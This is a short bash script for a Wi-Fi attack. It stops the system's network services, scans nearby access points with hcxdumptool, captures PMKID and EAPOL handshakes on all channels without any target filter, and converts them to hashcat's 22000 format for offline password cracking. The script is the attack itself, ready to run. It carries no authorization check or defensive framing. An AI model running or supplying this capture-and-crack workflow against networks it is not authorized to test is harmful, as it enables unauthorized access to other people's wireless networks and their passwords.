#!/bin/bash

# CONFIGURATION
INTERFACE="wlp0s20f0u1"         # Change to your wireless interface
DUMPFILE="capture.pcapng"
HASHFILE="hashes.22000"

# 1. Stop interfering services
echo "[*] Stopping interfering services..."
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

# 2. Scan for access points (no attack, just info)
echo "[*] Scanning for APs in range (press Ctrl+C to stop)..."
sudo hcxdumptool -i "$INTERFACE" -F --rcascan=active
read -p "[*] Press Enter to continue to capture mode..."

# 3. Start capture with PMKID/EAPOL collection and real-time sorting
echo "[*] Starting handshake capture..."
sudo hcxdumptool -i "$INTERFACE" -w "$DUMPFILE" -F --rds=1 

# 4. Convert capture to hashcat format
echo "[*] Converting pcapng to hashcat format..."
hcxpcapngtool -o "$HASHFILE" "$DUMPFILE"

echo "[*] Done."
